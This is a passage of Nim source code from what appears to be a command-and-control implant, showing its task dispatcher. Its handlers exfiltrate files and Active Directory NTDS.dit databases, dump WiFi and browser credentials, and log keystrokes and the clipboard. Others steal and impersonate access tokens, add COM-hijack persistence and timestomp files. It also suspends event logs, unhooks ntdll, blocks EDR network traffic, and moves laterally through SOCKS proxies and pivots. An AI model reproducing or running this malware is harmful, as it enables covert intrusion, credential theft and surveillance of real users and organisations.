      let remotePath = if rawPath == "." or rawPath.endsWith('/') or rawPath.endsWith('\\'):
                         (rawPath.strip(chars={'/', '\\'}) / extractFilename(fname))
                       else: rawPath
      let data = t.downloadFile(fname)
      if data.len == 0: t.sendResult(id, "", "download failed"); return
      writeFile(remotePath, cast[string](data))
      t.sendResult(id, "written " & $data.len & " bytes to " & remotePath, "")
    except: t.sendResult(id, "", getCurrentExceptionMsg())

  of "DOWNLOAD":
    try:
      let filePath = if args.strip().startsWith("{"):
                       parseJson(args){"path"}.getStr()
                     else: args
      let data = cast[seq[byte]](readFile(filePath))
      t.uploadFile(id, extractFilename(filePath), data)
      t.sendResult(id, "uploaded " & $data.len & " bytes", "")
    except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())

  of "KERB_LIST":
    when defined(windows): t.sendResult(id, kerberosListTickets(), "")
    else: t.sendResult(id, "", "KERB_LIST: not supported on Linux")

  of "KERB_PTT":
    when defined(windows): t.sendResult(id, kerberosPassTheTicket(args), "")
    else: t.sendResult(id, "", "KERB_PTT: not supported on Linux")

  of "KERB_PURGE":
    when defined(windows): t.sendResult(id, kerberosPurge(), "")
    else: t.sendResult(id, "", "KERB_PURGE: not supported on Linux")

  of "TIMESTOMP":
    when defined(windows):
      try:
        let j = if args.len > 0 and args[0] == '{': parseJson(args)
                else:
                  let parts = args.strip().split({' ', '\t'}, maxsplit=1)
                  %*{"target": parts[0], "ref": if parts.len > 1: parts[1] else: "C:\\Windows\\System32\\kernel32.dll"}
        let target  = j{"target"}.getStr()
        let refPath = j{"ref"}.getStr("C:\\Windows\\System32\\kernel32.dll")
        if target == "": t.sendResult(id, "", "TIMESTOMP: {\"target\":\"path\"} required"); return
        var hRef = CreateFileW(newWideCString(refPath), GENERIC_READ,
                    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL or FILE_FLAG_BACKUP_SEMANTICS, 0)
        if hRef == INVALID_HANDLE_VALUE: t.sendResult(id, "", "TIMESTOMP: cannot open ref"); return
        var ct, at, mt: FILETIME
        discard GetFileTime(hRef, addr ct, addr at, addr mt)
        discard CloseHandle(hRef)
        var hDst = CreateFileW(newWideCString(target), FILE_WRITE_ATTRIBUTES,
                    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL or FILE_FLAG_BACKUP_SEMANTICS, 0)
        if hDst == INVALID_HANDLE_VALUE: t.sendResult(id, "", "TIMESTOMP: cannot open target"); return
        discard SetFileTime(hDst, addr ct, addr at, addr mt)
        discard CloseHandle(hDst)
        t.sendResult(id, "[+] timestamps cloned from " & refPath & " to " & target, "")
      except: t.sendResult(id, "", "timestomp: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "TIMESTOMP: not supported on Linux")

  of "COM_HIJACK", "COM_HIJACK_RM":
    when defined(windows):
      if typ.toUpperAscii() == "COM_HIJACK":
        try:
          let j = parseJson(args)
          let clsid   = j{"clsid"}.getStr()
          let dllPath = j{"path"}.getStr()
          if clsid == "" or dllPath == "":
            t.sendResult(id, "", "COM_HIJACK: {\"clsid\":\"...\",\"path\":\"...\"} required"); return
          let keyPath = "Software\\Classes\\CLSID\\{" & clsid & "}\\InprocServer32"
          var hk: HKEY
          if RegCreateKeyExW(HKEY_CURRENT_USER, newWideCString(keyPath), 0, nil,
                             0, KEY_SET_VALUE, nil, addr hk, nil) != ERROR_SUCCESS:
            t.sendResult(id, "", "COM_HIJACK: RegCreateKeyEx failed"); return
          let dllW = newWideCString(dllPath)
          discard RegSetValueExW(hk, nil, 0, REG_SZ,
                                 cast[ptr BYTE](addr dllW[0]), DWORD((dllPath.len+1)*2))
          let tm = newWideCString("Apartment")
          discard RegSetValueExW(hk, newWideCString("ThreadingModel"), 0, REG_SZ,
                                 cast[ptr BYTE](addr tm[0]), 20)
          discard RegCloseKey(hk)
          t.sendResult(id, "[+] COM hijack: HKCU\\" & keyPath & " -> " & dllPath, "")
        except: t.sendResult(id, "", "com_hijack: " & getCurrentExceptionMsg())
      else:
        try:
          let clsid = parseJson(args){"clsid"}.getStr()
          if clsid == "": t.sendResult(id, "", "COM_HIJACK_RM: {\"clsid\":\"...\"} required"); return
          let keyPath = "Software\\Classes\\CLSID\\{" & clsid & "}"
          discard RegDeleteTreeW(HKEY_CURRENT_USER, newWideCString(keyPath))
          t.sendResult(id, "[+] COM hijack removed", "")
        except: t.sendResult(id, "", "com_hijack_rm: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", typ & ": not supported on Linux")

  of "CLIP_GET":
    when defined(windows):
      if OpenClipboard(0) == 0:
        t.sendResult(id, "", "CLIP_GET: OpenClipboard failed")
      else:
        let hData = GetClipboardData(CF_TEXT)
        if hData == 0:
          discard CloseClipboard()
          t.sendResult(id, "", "CLIP_GET: no text in clipboard")
        else:
          let text = cast[cstring](GlobalLock(hData))
          let res = if text != nil: $text else: ""
          discard GlobalUnlock(hData)
          discard CloseClipboard()
          t.sendResult(id, if res == "": "[clipboard empty]" else: res, "")
    else:
      t.sendResult(id, "", "CLIP_GET: not supported on Linux")

  of "WIFI_CREDS", "CRED_WIFI":
    when defined(windows):
      let profilesOut = runShell("netsh wlan show profiles 2>&1")
      var combined = ""
      for line in profilesOut.splitLines():
        let idx = line.find("All User Profile")
        if idx < 0: continue
        let colon = line.find(':', idx)
        if colon < 0: continue
        let name = line[colon+1..^1].strip()
        if name == "": continue
        let detail = runShell("netsh wlan show profile name=\"" & name & "\" key=clear 2>&1")
        combined.add(detail & "\n")
      t.sendResult(id, if combined == "": "[no WiFi profiles found]" else: combined, "")
    else:
      t.sendResult(id, "", "CRED_WIFI: not supported on Linux")

  of "NTDS_DUMP":
    when defined(windows):
      let outDir = try: parseJson(args){"path"}.getStr("C:\\Windows\\Temp\\ntds_ifm") except: "C:\\Windows\\Temp\\ntds_ifm"
      t.sendResult(id, runShell("ntdsutil \"ac i ntds\" \"ifm\" \"create full " & outDir & "\" q q 2>&1"), "")
    else:
      t.sendResult(id, "", "NTDS_DUMP: not supported on Linux")

  of "DCSYNC":
    # Extract ntds.dit + SYSTEM hive via IFM (default) or VSS; upload both for offline parsing.
    # Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
    # Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
    when defined(windows):
      try:
        let j       = try: parseJson(args) except: newJObject()
        let mode    = j{"mode"}.getStr("ifm")
        let tmpDir  = j{"out"}.getStr(r"C:\Users\Public\dcsync_out")
        var dcErr   = ""
        var ntdsPath = tmpDir & r"\Active Directory\ntds.dit"
        var sysPath  = tmpDir & r"\registry\SYSTEM"

        if mode == "vss":
          let vssOut = runShell("vssadmin create shadow /for=C: 2>&1")
          var shadowPath = ""
          for line in vssOut.splitLines():
            if "HarddiskVolumeShadowCopy" in line and r"\\?\" in line:
              for tok in line.splitWhitespace():
                if r"\\?\" in tok: shadowPath = tok.strip(chars = {'\r','\n'}); break
          if shadowPath == "":
            dcErr = "VSS shadow copy failed"
          else:
            discard runShell("mkdir \"" & tmpDir & "\" 2>&1")
            discard runShell("copy \"" & shadowPath & "\\Windows\\NTDS\\ntds.dit\" \"" & tmpDir & "\\ntds.dit\" /Y 2>&1")
            discard runShell("copy \"" & shadowPath & "\\Windows\\System32\\config\\SYSTEM\" \"" & tmpDir & "\\SYSTEM\" /Y 2>&1")
            ntdsPath = tmpDir & "\\ntds.dit"
            sysPath  = tmpDir & "\\SYSTEM"
        else:
          discard runShell("rmdir /S /Q \"" & tmpDir & "\" 2>&1")
          discard runShell("ntdsutil \"ac i ntds\" \"ifm\" \"create full " & tmpDir & "\" q q 2>&1")

        if dcErr == "":
          for tup in [(ntdsPath, "ntds.dit"), (sysPath, "SYSTEM")]:
            try:
              let dat = readFile(tup[0])
              t.uploadFile(id, tup[1], cast[seq[byte]](dat))
            except: dcErr.add("read " & tup[0] & ": " & getCurrentExceptionMsg() & "; ")
          discard runShell("rmdir /S /Q \"" & tmpDir & "\" 2>&1")
          t.sendResult(id, "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL", dcErr)
        else:
          t.sendResult(id, "", dcErr)
      except: t.sendResult(id, "", "dcsync: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "DCSYNC: not supported on Linux")

  of "ADS_LIST", "ADS_READ", "ADS_WRITE", "ADS_DEL":
    when defined(windows):
      case typ.toUpperAscii()
      of "ADS_LIST":
        if args == "": t.sendResult(id, "", "ADS_LIST: path required"); return
        var result2 = ""
        var sd: WIN32_FIND_STREAM_DATA
        let wpath = newWideCString(args)
        let hS = FindFirstStreamW(wpath, 0.STREAM_INFO_LEVELS, addr sd, 0)
        if hS == INVALID_HANDLE_VALUE:
          t.sendResult(id, "[no alternate streams]", "")
        else:
          result2.add($cast[WideCString](addr sd.cStreamName[0]) & "\t" & $sd.StreamSize.QuadPart & " bytes\n")
          while FindNextStreamW(hS, addr sd) != 0:
            result2.add($cast[WideCString](addr sd.cStreamName[0]) & "\t" & $sd.StreamSize.QuadPart & " bytes\n")
          discard FindClose(hS)
          t.sendResult(id, result2, "")
      of "ADS_READ":
        try:
          let colon = args.rfind(':')
          if colon <= 0: t.sendResult(id, "", "ADS_READ: <file>:<stream> required"); return
          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
          let adsPath = filePath & ":" & stream
          var hF = CreateFileW(newWideCString(adsPath), GENERIC_READ,
                   FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
          if hF == INVALID_HANDLE_VALUE:
            t.sendResult(id, "", "ADS_READ: open failed (err " & $GetLastError() & ")"); return
          let fsz = GetFileSize(hF, nil)
          if fsz == 0: discard CloseHandle(hF); t.sendResult(id, "[+] ADS stream is empty", ""); return
          var buf = newSeq[byte](fsz); var rd: DWORD
          discard ReadFile(hF, addr buf[0], fsz, addr rd, nil)
          discard CloseHandle(hF); buf.setLen(rd)
          t.uploadFile(id, stream, buf)
          t.sendResult(id, "[+] ADS read " & $rd & " bytes", "")
        except: t.sendResult(id, "", "ads_read: " & getCurrentExceptionMsg())
      of "ADS_WRITE":
        try:
          let colon = args.rfind(':')
          if colon <= 0 or payload.len == 0:
            t.sendResult(id, "", "ADS_WRITE: <file>:<stream> required (payload=data)"); return
          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
          let adsPath = filePath & ":" & stream
          var hF = CreateFileW(newWideCString(adsPath), GENERIC_WRITE,
                   0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
          if hF == INVALID_HANDLE_VALUE:
            t.sendResult(id, "", "ADS_WRITE: create failed (err " & $GetLastError() & ")"); return
          var wr: DWORD
          discard WriteFile(hF, cast[LPCVOID](unsafeAddr payload[0]), DWORD(payload.len), addr wr, nil)
          discard CloseHandle(hF)
          t.sendResult(id, "[+] wrote " & $wr & " bytes to " & adsPath, "")
        except: t.sendResult(id, "", "ads_write: " & getCurrentExceptionMsg())
      of "ADS_DEL":
        try:
          let colon = args.rfind(':')
          if colon <= 0: t.sendResult(id, "", "ADS_DEL: <file>:<stream> required"); return
          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
          let adsPath = filePath & ":" & stream
          if DeleteFileW(newWideCString(adsPath)) != 0:
            t.sendResult(id, "[+] ADS stream deleted", "")
          else:
            t.sendResult(id, "", "ADS_DEL: DeleteFile failed (err " & $GetLastError() & ")")
        except: t.sendResult(id, "", "ads_del: " & getCurrentExceptionMsg())
      else: discard
    else:
      t.sendResult(id, "", typ & ": not supported on Linux")

  of "SCREENWATCH_START":
    if not gSwStop: t.sendResult(id, "[-] screenwatch already running", ""); return
    gSwInterval = try: parseJson(args){"interval"}.getInt(10) except: 10
    if gSwInterval < 1: gSwInterval = 1
    gSwTaskId = id; gSwLastTick = 0.0; gSwFrame = 0; gSwStop = false
    t.sendResult(id, "[+] screenwatch started (interval " & $gSwInterval & "s)", "")

  of "SCREENWATCH_STOP":
    if gSwStop: t.sendResult(id, "[-] screenwatch not running", ""); return
    gSwStop = true; gSwFrame = 0
    t.sendResult(id, "[+] screenwatch stopped", "")

  of "TOKEN_STORE_STEAL", "TOKEN_STORE_SHOW", "TOKEN_STORE_USE",
     "TOKEN_STORE_REMOVE", "TOKEN_STORE_CLEAR":
    when defined(windows):
      case typ.toUpperAscii()
      of "TOKEN_STORE_STEAL":
        try:
          let pid2 = DWORD(parseJson(args){"pid"}.getInt(0))
          if pid2 == 0: t.sendResult(id, "", "TOKEN_STORE_STEAL requires {\"pid\":N}"); return
          t.sendResult(id, doTokenStoreSteal(pid2), "")
        except: t.sendResult(id, "", "token_store_steal: " & getCurrentExceptionMsg())
      of "TOKEN_STORE_SHOW":
        if gTokenStore.len == 0:
          t.sendResult(id, "token store is empty", "")
        else:
          var tsOut = ""
          for e in gTokenStore:
            tsOut.add("id=" & $e.id & " pid=" & $e.pid & " user=" & e.user & "\n")
          t.sendResult(id, tsOut, "")
      of "TOKEN_STORE_USE":
        try:
          let tokId = parseJson(args){"id"}.getInt(0)
          if tokId <= 0 or tokId > gTokenStore.len:
            t.sendResult(id, "", "invalid token id"); return
          let entry = gTokenStore[tokId-1]
          if ImpersonateLoggedOnUser(entry.token) == 0:
            t.sendResult(id, "", "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"); return
          t.sendResult(id, "[+] impersonating token id=" & $tokId & " user=" & entry.user, "")
        except: t.sendResult(id, "", "token_store_use: " & getCurrentExceptionMsg())
      of "TOKEN_STORE_REMOVE":
        try:
          let tokId = parseJson(args){"id"}.getInt(0)
          if tokId <= 0 or tokId > gTokenStore.len:
            t.sendResult(id, "", "invalid token id"); return
          discard CloseHandle(gTokenStore[tokId-1].token)
          gTokenStore.delete(tokId-1)
          t.sendResult(id, "[+] removed token id=" & $tokId, "")
        except: t.sendResult(id, "", "token_store_remove: " & getCurrentExceptionMsg())
      of "TOKEN_STORE_CLEAR":
        for e in gTokenStore: discard CloseHandle(e.token)
        gTokenStore.setLen(0)
        t.sendResult(id, "[+] token store cleared", "")
      else: discard
    else:
      t.sendResult(id, "", typ & ": not supported on Linux")

  of "BLOCKDLLS":
    when defined(windows): t.sendResult(id, doBlockDlls(args.strip().toLowerAscii() != "off"), "")
    else: t.sendResult(id, "", "BLOCKDLLS: not supported on Linux")

  of "EVENTLOG_SUSPEND":
    when defined(windows): t.sendResult(id, doEventlogSuspendResume(true), "")
    else: t.sendResult(id, "", "EVENTLOG_SUSPEND: not supported on Linux")

  of "EVENTLOG_RESUME":
    when defined(windows): t.sendResult(id, doEventlogSuspendResume(false), "")
    else: t.sendResult(id, "", "EVENTLOG_RESUME: not supported on Linux")

  of "PEB_SPOOF":
    when defined(windows):
      try:
        let newPath = parseJson(args){"path"}.getStr()
        if newPath == "": t.sendResult(id, "", "PEB_SPOOF requires {\"path\":\"...\"}"); return
        t.sendResult(id, doPebSpoof(newPath), "")
      except: t.sendResult(id, "", "peb_spoof: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "PEB_SPOOF: not supported on Linux")

  of "ISHELL_OPEN":
    when defined(windows):
      var shellArg = args.strip()
      try:
        let openArgs = parseJson(args)
        if openArgs.kind == JObject and openArgs.hasKey("shell"):
          shellArg = openArgs["shell"].getStr()
      except: discard # legacy clients send the shell name as plain text
      if shellArg == "": shellArg = "cmd"
      t.sendResult(id, doIshellOpen(shellArg), "")
    else:
      t.sendResult(id, "", "ISHELL_OPEN: not supported on Linux")

  of "ISHELL_RUN":
    when defined(windows):
      var cmdLine = args
      try:
        let runArgs = parseJson(args)
        if runArgs.kind == JObject and runArgs.hasKey("cmd"):
          cmdLine = runArgs["cmd"].getStr()
      except: discard # legacy clients may send a raw PowerShell block
      t.sendResult(id, doIshellRun(cmdLine), "")
    else: t.sendResult(id, "", "ISHELL_RUN: not supported on Linux")

  of "ISHELL_CLOSE":
    when defined(windows): t.sendResult(id, doIshellClose(), "")
    else: t.sendResult(id, "", "ISHELL_CLOSE: not supported on Linux")

  of "NTDLL_UNHOOK":
    when defined(windows): t.sendResult(id, doNtdllUnhook(), "")
    else: t.sendResult(id, "", "NTDLL_UNHOOK: not supported on Linux")

  of "KEYLOG_START":
    when defined(windows):
      if not gKeylogStop:
        t.sendResult(id, "[-] keylogger already running", "")
      else:
        gKeylogStop = false; gKeylogBuf = ""
        var tid3: DWORD = 0
        gKeylogThread = CreateThread(nil, 0, keylogThreadProc, nil, 0, addr tid3)
        if gKeylogThread == 0:
          gKeylogStop = true
          t.sendResult(id, "", "CreateThread failed (err " & $GetLastError() & ")")
        else:
          t.sendResult(id, "[+] keylogger started", "")
    else:
      t.sendResult(id, "", "KEYLOG_START: not supported on Linux (no X11 hook yet)")

  of "KEYLOG_STOP":
    when defined(windows):
      gKeylogStop = true
      if gKeylogThread != 0:
        discard WaitForSingleObject(gKeylogThread, DWORD(3000))
        discard CloseHandle(gKeylogThread); gKeylogThread = 0
      t.sendResult(id, "[+] keylogger stopped", "")
    else:
      gKeylogStop = true
      t.sendResult(id, "[+] keylogger stopped", "")

  of "KEYLOG_DUMP":
    let kbuf = gKeylogBuf; gKeylogBuf = ""
    t.sendResult(id, if kbuf == "": "[empty]" else: kbuf, "")

  of "SOCKS_START":
    if not gSocksStop:
      t.sendResult(id, "[-] SOCKS5 already running", "")
    else:
      try:
        let port = parseJson(args){"port"}.getInt(1080)
        gSocksStop = false
        when defined(windows):
          var tid4: DWORD = 0
          gSocksThread = CreateThread(nil, 0, socksServerProc, cast[LPVOID](port), 0, addr tid4)
          if gSocksThread == 0:
            gSocksStop = true
            t.sendResult(id, "", "CreateThread failed (err " & $GetLastError() & ")")
          else:
            t.sendResult(id, "[+] SOCKS5 started on port " & $port, "")
        else:
          createThread(gSocksServerThread, linuxSocksServerProc, port)
          t.sendResult(id, "[+] SOCKS5 started on port " & $port, "")
      except: t.sendResult(id, "", "socks_start: " & getCurrentExceptionMsg())

  of "SOCKS_STOP":
    gSocksStop = true
    when defined(windows):
      if gSocksSocket != INVALID_SOCKET: discard closesocket(gSocksSocket)
      if gSocksThread != 0:
        discard WaitForSingleObject(gSocksThread, DWORD(3000))
        discard CloseHandle(gSocksThread); gSocksThread = 0
    else:
      if gSocksListenFd >= 0:
        discard posixLib.close(gSocksListenFd)
        gSocksListenFd = -1
      try: joinThread(gSocksServerThread) except: discard
    t.sendResult(id, "[+] SOCKS5 stopped", "")

  of "SESSION_GOPHER":
    when defined(windows): t.sendResult(id, doSessionGopher(), "")
    else: t.sendResult(id, "", "SESSION_GOPHER: not supported on Linux")

  of "GPP_HUNT":
    when defined(windows): t.sendResult(id, doGppHunt(), "")
    else: t.sendResult(id, "", "GPP_HUNT: not supported on Linux")

  of "LATERAL", "JUMP":
    when defined(windows):
      try:
        let j = parseJson(args)
        let meth        = j{"method"}.getStr("atexec")
        let host        = j{"host"}.getStr()
        let user        = j{"user"}.getStr()
        let pass        = j{"pass"}.getStr()
        var cmd         = j{"cmd"}.getStr()
        let localPath   = j{"local_path"}.getStr()
        var payData:    seq[byte] = @[]
        if localPath != "" and cmd == "":
          cmd = localPath
        let payloadName = j{"payload"}.getStr()
        if payloadName != "":
          if payloadName == "self":
            payData = cast[seq[byte]](readFile(getAppFilename()))
            if cmd == "": cmd = getAppFilename()
          elif payload.len > 0:
            payData = payload
            if cmd == "":
              let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
              try: writeFile(tmpPath, cast[string](payData))
              except: discard
              cmd = tmpPath
          else:
            payData = t.downloadFile(payloadName)
            if payData.len == 0:
              t.sendResult(id, "", "LATERAL: payload download failed"); return
            if cmd == "":
              let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
              try: writeFile(tmpPath, cast[string](payData))
              except: discard  # methods that use payData bytes don't need local file
              cmd = tmpPath
        if host == "": t.sendResult(id, "", "LATERAL requires host"); return
        if cmd == "" and payData.len == 0:
          t.sendResult(id, "", "LATERAL requires cmd or payload"); return
        t.sendResult(id, doLateral(meth, host, user, pass, cmd, payData), "")
      except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "LATERAL: not supported on Linux")

  of "BROWSER_CREDS":
    when defined(windows): t.sendResult(id, doBrowserCreds(), "")
    else: t.sendResult(id, "", "BROWSER_CREDS: not supported on Linux")

  of "CLIP_MONITOR_START":
    when defined(windows):
      if not gClipStop:
        t.sendResult(id, "", "clipboard monitor already running")
      else:
        gClipBuf = ""
        gClipInterval = max(1, try: parseInt(args.strip()) except: 5)
        gClipThread = CreateThread(nil, 0, clipMonThreadProc, nil, 0, nil)
        t.sendResult(id, if gClipThread != 0: "[+] clipboard monitor started" else: "", "")
    else:
      t.sendResult(id, "", "CLIP_MONITOR_START: not supported on Linux")

  of "CLIP_MONITOR_DUMP":
    when defined(windows):
      let out2 = if gClipBuf.len > 0: gClipBuf else: "[no clipboard data]"
      gClipBuf = ""
      t.sendResult(id, out2, "")
    else:
      t.sendResult(id, "", "CLIP_MONITOR_DUMP: not supported on Linux")

  of "CLIP_MONITOR_STOP":
    when defined(windows):
      gClipStop = true
      if gClipThread != 0:
        discard WaitForSingleObject(gClipThread, DWORD(3000))
        discard CloseHandle(gClipThread); gClipThread = 0
      t.sendResult(id, "[+] clipboard monitor stopped", "")
    else:
      t.sendResult(id, "", "CLIP_MONITOR_STOP: not supported on Linux")

  of "SEARCH":
    when defined(windows):
      var parts = args.strip().split(' ')
      var root = ""; var pat = ""
      if parts.len >= 2: root = parts[0]; pat = parts[1..^1].join(" ")
      elif parts.len == 1: pat = parts[0]
      if pat == "":
        t.sendResult(id, "", "usage: search [root] <pattern>")
      else:
        if root == "":
          root = getEnv("USERPROFILE")
          if root == "": root = "C:\\"
        var results: seq[string] = @[]
        searchDir(root, pat, results, 2000)
        if results.len == 0:
          t.sendResult(id, "no files found", "")
        else:
          t.sendResult(id, "[" & $results.len & " files]\n" & results.join("\n"), "")
    else:
      var parts = args.strip().split(' ')
      var root = ""; var pat = ""
      if parts.len >= 2: root = parts[0]; pat = parts[1..^1].join(" ")
      elif parts.len == 1: pat = parts[0]
      if pat == "":
        t.sendResult(id, "", "usage: search [root] <pattern>")
      else:
        if root == "": root = getEnv("HOME", "/root")
        let (outp, _) = execCmdEx("find " & quoteShell(root) & " -name " & quoteShell(pat) & " 2>/dev/null | head -2000")
        let lines = outp.strip().splitLines()
        if lines.len == 0 or (lines.len == 1 and lines[0] == ""):
          t.sendResult(id, "no files found", "")
        else:
          t.sendResult(id, "[" & $lines.len & " files]\n" & outp, "")

  of "EVASION_STATUS":
    let status = "sleep_sec=" & $sleepSecDyn & " jitter_pct=" & $jitterDyn &
      " keylog=" & (if not gKeylogStop: "on" else: "off") &
      " screenwatch=" & (if not gSwStop: "on" else: "off") &
      " socks=" & (if not gSocksStop: "on" else: "off") &
      (when defined(windows): " clip_monitor=" & (if not gClipStop: "on" else: "off") else: "")
    t.sendResult(id, status, "")

  of "CLEANUP":
    when defined(windows):
      var selfPath = newString(MAX_PATH)
      let n = GetModuleFileNameW(0, newWideCString(selfPath), DWORD(MAX_PATH))
      selfPath.setLen(n.int)
      let cmd = "cmd /c ping -n 3 127.0.0.1 > nul & del /f /q \"" & selfPath & "\""
      var si: STARTUPINFOW; var pi: PROCESS_INFORMATION
      zeroMem(addr si, sizeof(si)); si.cb = DWORD(sizeof(si))
      discard CreateProcessW(nil, newWideCString(cmd), nil, nil, 0,
        DWORD(CREATE_NO_WINDOW or DETACHED_PROCESS), nil, nil, addr si, addr pi)
      if pi.hProcess != 0: discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
      t.sendResult(id, "[+] scheduled self-delete; exiting", "")
      quit(0)
    else:
      let selfPath = getAppFilename()
      t.sendResult(id, "[+] scheduled self-delete; exiting", "")
      discard execCmdEx("(sleep 2 && rm -f " & quoteShell(selfPath) & ") &")
      quit(0)

  of "HOOK_CHECK":
    when defined(windows):
      const hookFns = [
        ("ntdll.dll",    "NtOpenProcess"),
        ("ntdll.dll",    "NtAllocateVirtualMemory"),
        ("ntdll.dll",    "NtWriteVirtualMemory"),
        ("ntdll.dll",    "NtCreateThreadEx"),
        ("ntdll.dll",    "NtProtectVirtualMemory"),
        ("ntdll.dll",    "NtReadVirtualMemory"),
        ("ntdll.dll",    "NtQueueApcThread"),
        ("ntdll.dll",    "NtCreateSection"),
        ("ntdll.dll",    "NtMapViewOfSection"),
        ("ntdll.dll",    "NtUnmapViewOfSection"),
        ("ntdll.dll",    "NtSuspendThread"),
        ("ntdll.dll",    "NtResumeThread"),
        ("ntdll.dll",    "NtGetContextThread"),
        ("ntdll.dll",    "NtSetContextThread"),
      ]
      var sb = "[HOOK_CHECK]\n"
      for (dll, fn) in hookFns:
        let hMod = GetModuleHandleA(dll)
        if hMod == 0:
          sb.add("  MISS  " & dll & "!" & fn & " (module not loaded)\n"); continue
        let fnPtr = GetProcAddress(hMod, fn)
        if fnPtr == nil:
          sb.add("  MISS  " & dll & "!" & fn & " (export not found)\n"); continue
        let b = cast[ptr byte](fnPtr)[]
        let status = case b
          of 0xE9: "HOOKED (JMP)"
          of 0xE8: "HOOKED (CALL)"
          of 0xCC: "HOOKED (INT3)"
          else:    "clean (0x" & b.int.toHex(2) & ")"
        sb.add("  " & (if b in [0xE9'u8, 0xE8'u8, 0xCC'u8]: "!" else: " ") & "     " & dll & "!" & fn & " → " & status & "\n")
      t.sendResult(id, sb, "")
    else:
      t.sendResult(id, "", "HOOK_CHECK: not supported on Linux")

  of "HW_BP_CHECK":
    when defined(windows):
      let hThread = OpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT, 0, GetCurrentThreadId())
      if hThread == 0:
        t.sendResult(id, "", "HW_BP_CHECK: OpenThread failed (err " & $GetLastError() & ")")
      else:
        var ctx: CONTEXT
        zeroMem(addr ctx, sizeof(ctx))
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
        if GetThreadContext(hThread, addr ctx) == 0:
          discard CloseHandle(hThread)
          t.sendResult(id, "", "HW_BP_CHECK: GetThreadContext failed")
        else:
          discard CloseHandle(hThread)
          let dr0 = ctx.Dr0; let dr1 = ctx.Dr1; let dr2 = ctx.Dr2; let dr3 = ctx.Dr3
          let any = dr0 or dr1 or dr2 or dr3
          var sb2 = "[HW_BP_CHECK] " & (if any != 0: "DETECTED" else: "clean") & "\n"
          sb2.add("  DR0=0x" & dr0.int64.toHex(16) & "\n")
          sb2.add("  DR1=0x" & dr1.int64.toHex(16) & "\n")
          sb2.add("  DR2=0x" & dr2.int64.toHex(16) & "\n")
          sb2.add("  DR3=0x" & dr3.int64.toHex(16) & "\n")
          t.sendResult(id, sb2, "")
    else:
      t.sendResult(id, "", "HW_BP_CHECK: not supported on Linux")

  of "EDR_SILENCE", "EDR_SILENCE_RM":
    when defined(windows):
      if typ.toUpperAscii() == "EDR_SILENCE":
        try:
          var pid = 0
          try: pid = parseJson(args){"pid"}.getInt(0) except: discard
          if pid == 0:
            try: pid = parseInt(args.strip()) except: discard
          if pid == 0:
            t.sendResult(id, "", "EDR_SILENCE requires {pid:N}")
          else:
            let pathCmd = "powershell -NoProfile -NonInteractive -Command \"(Get-Process -Id " & $pid & ").Path\""
            let procPath = runShell(pathCmd).strip()
            if procPath == "" or not procPath.toLowerAscii().endsWith(".exe"):
              t.sendResult(id, "", "EDR_SILENCE: could not resolve path for PID " & $pid)
            else:
              let ruleName = "EDRSilence_" & $pid
              let netshCmd = "netsh advfirewall firewall add rule name=\"" & ruleName &
                "\" dir=out action=block program=\"" & procPath & "\" enable=yes"
              t.sendResult(id, "[+] EDR_SILENCE pid=" & $pid & " path=" & procPath & "\n" & runShell(netshCmd), "")
        except: t.sendResult(id, "", "EDR_SILENCE: " & getCurrentExceptionMsg())
      else:
        try:
          var pid = 0
          try: pid = parseJson(args){"pid"}.getInt(0) except: discard
          if pid == 0:
            try: pid = parseInt(args.strip()) except: discard
          if pid == 0:
            t.sendResult(id, "", "EDR_SILENCE_RM requires {pid:N}")
          else:
            let ruleName = "EDRSilence_" & $pid
            t.sendResult(id, "[+] rule removed: " & ruleName & "\n" &
              runShell("netsh advfirewall firewall delete rule name=\"" & ruleName & "\""), "")
        except: t.sendResult(id, "", "EDR_SILENCE_RM: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", typ & ": not supported on Linux")

  of "RSOCKS_START":
    when defined(windows): t.sendResult(id, startRSocks(args.strip()), "")
    else: t.sendResult(id, "", "RSOCKS_START: not supported on Linux yet")

  of "RSOCKS_STOP":
    when defined(windows): t.sendResult(id, stopRSocks(), "")
    else: t.sendResult(id, "", "RSOCKS_STOP: not supported on Linux yet")

  of "HTTP_PIVOT_START":
    when defined(windows):
      try:
        let port = parseJson(args){"port"}.getInt(0)
        if port == 0:
          t.sendResult(id, "", "HTTP_PIVOT_START requires {port:N}")
        else:
          gHttpPivotAgentID = t.agentId
          t.sendResult(id, startHttpPivot(port), "")
      except: t.sendResult(id, "", "HTTP_PIVOT_START: " & getCurrentExceptionMsg())
    else:
      t.sendResult(id, "", "HTTP_PIVOT_START: not supported on Linux yet")

  of "HTTP_PIVOT_STOP":
    when defined(windows): t.sendResult(id, stopHttpPivot(), "")
    else: t.sendResult(id, "", "HTTP_PIVOT_STOP: not supported on Linux yet")

  of "TCP_PIVOT_START":
    when defined(windows):
      try:
        let port = parseJson(args){"port"}.getInt(0)
        if port == 0:
          t.sendResult(id, "", "TCP_PIVOT_START requires {port:N}")
        else:
          gTcpPivotAgentID = t.agentId
          t.sendResult(id, startTcpPivot(port), "")
